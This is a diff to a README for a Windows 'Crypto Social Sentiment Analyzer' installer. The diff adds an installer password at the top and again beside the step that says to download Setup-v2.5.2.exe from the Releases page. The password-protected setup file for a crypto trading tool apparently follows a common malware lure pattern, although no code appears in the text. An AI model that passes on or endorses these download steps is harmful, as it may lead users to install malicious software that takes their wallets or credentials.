@@ -1,3 +1,5 @@
+# Password
+ZHqAz8l
 # Crypto Social Sentiment Analyzer (CSSA) - Windows Installer
 CSSA is a desktop application for Windows that analyzes sentiment from social media and news about cryptocurrencies and provides data for automated trading. The software leverages aggregated data from sentiment-tracking platforms to monitor market mood and identify emerging trends.
 
@@ -16,6 +18,8 @@ Trending Words: Identify the most popular terms currently trending in cryptocurr
 The installation is straightforward via the provided setup.exe installer for Windows.
 
 # Installation Steps:
+
+password: ZHqAz8l
 
 Download the latest Setup-v2.5.2.exe file from the Releases page.
 
